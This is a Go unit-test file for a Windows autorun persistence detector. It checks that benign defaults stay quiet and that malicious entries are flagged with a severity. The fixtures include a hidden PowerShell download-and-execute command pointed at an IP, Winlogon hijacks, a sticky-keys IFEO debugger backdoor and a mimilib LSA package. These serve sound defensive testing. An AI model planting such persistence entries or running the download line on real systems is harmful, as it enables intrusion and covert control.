package collector

import "testing"

func TestJudgeAutorunDefaultsAreQuiet(t *testing.T) {
	quiet := []autorunEntry{
		{Kind: "run", Location: `HKLM\...\Run`, Name: "SecurityHealth", Command: `C:\Windows\system32\SecurityHealthSystray.exe`, Enabled: true},
		{Kind: "run", Location: `HKU\S-1-5-21-1\...\Run`, Name: "OneDrive", Command: `"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background`, Enabled: true},
		{Kind: "winlogon", Name: "Shell", Command: "explorer.exe", Enabled: true},
		{Kind: "winlogon", Name: "Userinit", Command: `C:\Windows\system32\userinit.exe,`, Enabled: true},
		{Kind: "boot_execute", Name: "BootExecute", Command: "autocheck autochk *", Enabled: true},
		{Kind: "boot_execute", Name: "BootExecute", Command: "autocheck autochk /q /v *", Enabled: true},
		{Kind: "lsa_authentication_packages", Command: "msv1_0", Enabled: true},
		{Kind: "lsa_security_packages", Command: `""`, Enabled: true},
		{Kind: "lsa_security_packages", Command: "kerberos", Enabled: true},
		{Kind: "lsa_notification_packages", Command: "scecli", Enabled: true},
		{Kind: "print_monitor", Name: "Local Port", Command: "localspl.dll", Enabled: true},
		{Kind: "netsh_helper", Name: "4", Command: "ifmon.dll", Enabled: true},
		{Kind: "screensaver", Command: `C:\Windows\system32\Mystify.scr`, Enabled: true},
		{Kind: "startup_folder", Name: "Teams.lnk", Command: `"C:\Users\a\AppData\Local\Microsoft\Teams\Update.exe" --processStart Teams.exe`, Enabled: true},
	}
	for _, e := range quiet {
		if got := judgeAutorun(e, `C:\Windows`); len(got) != 0 {
			t.Errorf("%s/%s %q: unexpected %v", e.Kind, e.Name, e.Command, keys(rulesOf(got)))
		}
	}
}

func TestJudgeAutorunFindsEvil(t *testing.T) {
	cases := []struct {
		e    autorunEntry
		want string
		sev  Severity
	}{
		{autorunEntry{Kind: "run", Name: "upd", Command: `%TEMP%\upd.exe`, Enabled: true}, "persistence.autorun_unusual_path", SevSuspect},
		{autorunEntry{Kind: "run", Name: "x", Command: `rundll32.exe C:\Users\Public\x.dll,Start`, Enabled: true}, "persistence.autorun_unusual_path", SevSuspect},
		{autorunEntry{Kind: "run", Name: "ps", Command: `powershell -w hidden -nop -c "iex (iwr http://198.51.100.4/a)"`, Enabled: true}, "exec.download_execute", SevCritical},
		{autorunEntry{Kind: "winlogon", Name: "Shell", Command: `explorer.exe, C:\ProgramData\svc.exe`, Enabled: true}, "persistence.winlogon_hijack", SevSuspect},
		{autorunEntry{Kind: "winlogon", Name: "Userinit", Command: `C:\Windows\system32\userinit.exe, C:\Windows\temp\a.exe`, Enabled: true}, "persistence.winlogon_hijack", SevSuspect},
		{autorunEntry{Kind: "winlogon", Name: "Userinit", Command: `C:\Users\Public\userinit.exe`, Enabled: true}, "persistence.winlogon_hijack", SevSuspect},
		{autorunEntry{Kind: "winlogon_extra", Name: "Taskman", Command: `C:\x\t.exe`, Enabled: true}, "persistence.winlogon_extra", SevSuspect},
		{autorunEntry{Kind: "boot_execute", Command: `autocheck autochk *`, Enabled: true, Name: "x"}, "", ""},
		{autorunEntry{Kind: "boot_execute", Command: `evil.exe`, Enabled: true}, "persistence.boot_execute", SevSuspect},
		{autorunEntry{Kind: "lsa_security_packages", Command: "mimilib", Enabled: true}, "persistence.lsa_security_package", SevSuspect},
		{autorunEntry{Kind: "lsa_notification_packages", Command: "evilfilter", Enabled: true}, "persistence.password_filter", SevSuspect},
		{autorunEntry{Kind: "lsa_authentication_packages", Command: "evilauth", Enabled: true}, "persistence.lsa_authentication_package", SevSuspect},
		{autorunEntry{Kind: "appcert_dlls", Name: "x", Command: `C:\x\cert.dll`, Enabled: true}, "persistence.appcert_dlls", SevSuspect},
		{autorunEntry{Kind: "appinit_dlls", Command: `C:\x\a.dll`, Enabled: true}, "persistence.appinit_dlls", SevNotable},
		{autorunEntry{Kind: "appinit_dlls", Command: `C:\x\a.dll`, Enabled: false}, "persistence.appinit_dlls", SevNotable},
		{autorunEntry{Kind: "ifeo_debugger", Name: "sethc.exe", Command: `C:\Windows\System32\cmd.exe`, Enabled: true}, "persistence.ifeo_debugger", SevSuspect},
		{autorunEntry{Kind: "silent_process_exit", Name: "notepad.exe", Command: `C:\x\m.exe`, Enabled: true}, "persistence.silent_process_exit", SevSuspect},
		{autorunEntry{Kind: "cmd_autorun", Command: `C:\x\a.bat`, Enabled: true}, "persistence.cmd_autorun", SevNotable},
		{autorunEntry{Kind: "print_monitor", Name: "Evil", Command: `evilmon.dll`, Enabled: true}, "persistence.print_monitor", SevNotable},
		{autorunEntry{Kind: "netsh_helper", Name: "evil", Command: `C:\x\helper.dll`, Enabled: true}, "persistence.netsh_helper", SevNotable},
		{autorunEntry{Kind: "screensaver", Command: `C:\Users\a\AppData\Roaming\x.exe`, Enabled: true}, "persistence.screensaver", SevNotable},
		{autorunEntry{Kind: "windows_load", Name: "Load", Command: `C:\x\l.exe`, Enabled: true}, "persistence.windows_load", SevSuspect},
		{autorunEntry{Kind: "startup_folder", Name: "x.vbs", Command: `C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.vbs`, Enabled: true, Direct: true},
			"persistence.startup_folder_program", SevSuspect},
	}
	for _, c := range cases {
		got := rulesOf(judgeAutorun(c.e, `C:\Windows`))
		if c.want == "" {
			if len(got) != 0 {
				t.Errorf("%s %q: unexpected %v", c.e.Kind, c.e.Command, keys(got))
			}
			continue
		}
		f, ok := got[c.want]
		if !ok {
			t.Errorf("%s %q: %s missing (got %v)", c.e.Kind, c.e.Command, c.want, keys(got))
			continue
		}
		if f.Severity != c.sev {
			t.Errorf("%s %q: %s severity %s, want %s", c.e.Kind, c.e.Command, c.want, f.Severity, c.sev)
		}
	}
}
